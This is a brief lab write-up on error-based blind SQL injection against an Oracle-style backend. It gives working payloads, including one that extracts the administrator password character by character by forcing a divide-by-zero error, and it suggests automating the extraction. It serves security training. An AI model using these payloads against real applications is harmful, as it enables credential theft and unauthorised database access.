# Lab: Blind SQL injection with conditional errors (Practitioner)

**Goal:** Extract administrator password via error-based blind SQLi.

## Technique

Trigger a database error (e.g. division by zero or invalid TO_CHAR) only when the condition is true. The application returns a different HTTP status or error page.

## Common Payload Pattern (Oracle-style often used)

```
' AND (SELECT CASE WHEN (condition) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)--
```

Or for password extraction:

```
' AND (SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)--
```

## Steps

1. Confirm error can be triggered.
2. Extract length, then each character using CASE WHEN + error.
3. Automate with Intruder or script.

## Notes

This lab usually uses Oracle. Adjust syntax accordingly.
